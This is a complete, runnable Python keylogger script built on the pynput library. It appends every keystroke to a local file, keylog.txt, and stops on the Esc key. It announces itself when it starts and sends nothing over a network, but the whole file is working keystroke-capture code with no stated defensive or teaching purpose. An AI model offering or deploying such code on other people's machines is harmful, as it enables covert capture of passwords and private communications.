from pynput.keyboard import Key, Listener

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")

def on_release(key):
    if key == Key.esc: 
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    print("Keylogger started. Press 'esc' key to stop.")
    start_keylogger()

if __name__ == "__main__":
    main()
